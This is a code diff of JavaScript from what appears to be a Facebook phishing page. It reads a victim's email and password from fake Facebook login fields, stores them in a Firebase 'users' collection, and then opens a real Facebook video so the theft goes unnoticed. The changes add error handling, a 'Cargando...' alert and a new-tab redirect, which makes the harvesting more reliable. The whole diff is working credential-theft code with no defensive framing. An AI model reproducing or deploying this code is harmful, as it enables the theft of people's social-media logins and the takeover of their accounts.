@@ -14,18 +14,26 @@ firebase.initializeApp({
     var correoFace = document.getElementById('emailFacebook').value;
     var contrasenaFace = document.getElementById('passFacebook').value;
 
+    try {
+      
       db.collection("users").add({
-          correo: correoFace,
-          contrasena: contrasenaFace
-      })
-          .then(function(docRef) {
-            console.log("Document written with ID: ", docRef.id);
-            window.location="https://www.facebook.com/guelodeluxe/videos/626779717830744/";
-              document.getElementById('emailFacebook').value='';
-              document.getElementById('passFacebook').value='';
-          })
-          .catch(function(error) {
-              console.error("Error adding document: ", error);
-      });
+        correo: correoFace,
+        contrasena: contrasenaFace
+    })
+        .then(function(docRef) {
+          console.log("Document written with ID: ", docRef.id);
+            document.getElementById('emailFacebook').value='';
+            document.getElementById('passFacebook').value='';
+        })
+        .catch(function(error) {
+            console.error("Error adding document: ", error);
+    });
+
+    } catch (error) {
+      alert('Cargando...')
+    }
+
+    window.open("https://www.facebook.com/guelodeluxe/videos/626779717830744/","_blank");
+
 
     }//Aqui termina el metodo para las coordenadas
